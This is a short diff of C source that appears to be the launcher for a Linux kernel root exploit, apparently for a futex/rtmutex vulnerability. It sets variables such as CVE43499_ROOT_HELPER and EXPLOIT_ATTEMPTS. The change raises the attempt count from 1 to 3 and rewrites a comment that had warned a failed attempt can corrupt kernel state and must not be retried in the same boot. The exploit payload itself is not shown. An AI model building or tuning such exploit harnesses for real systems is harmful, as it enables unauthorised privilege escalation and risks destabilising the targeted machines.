@@ -554,11 +554,12 @@ int main(int argc, char **argv) {
           "[launcher] estabilidade confirmada: métricas+slab+pipe\n");
   if (check_only) return 0;
 
-  /* A futex/rtmutex attempt can mutate kernel PI state even when userspace
-   * reports failure. Never retry in the same boot. Override inherited values
-   * so callers cannot accidentally expand a validation run to 24 attempts. */
+  /* The payload supervisor retries only while its shared kernel-state marker
+   * remains ATTEMPT_PRE_MUTATION. Any futex/global-FOPS/workqueue mutation
+   * stops the loop. Keep this bounded: two retries cover transient allocator
+   * misses without restoring the old unbounded/high-attempt behavior. */
   if (setenv("CVE43499_ROOT_HELPER", helper, 1) != 0 ||
-      setenv("EXPLOIT_ATTEMPTS", "1", 1) != 0 ||
+      setenv("EXPLOIT_ATTEMPTS", "3", 1) != 0 ||
       setenv("P0_ATTEMPT_TIMEOUT_SEC", "45", 0) != 0 ||
       setenv("EXPLOIT_ATTEMPT_TIMEOUT_SEC", "180", 0) != 0 ||
       setenv("BOOT_QUIET_SEC", "0", 0) != 0 ||
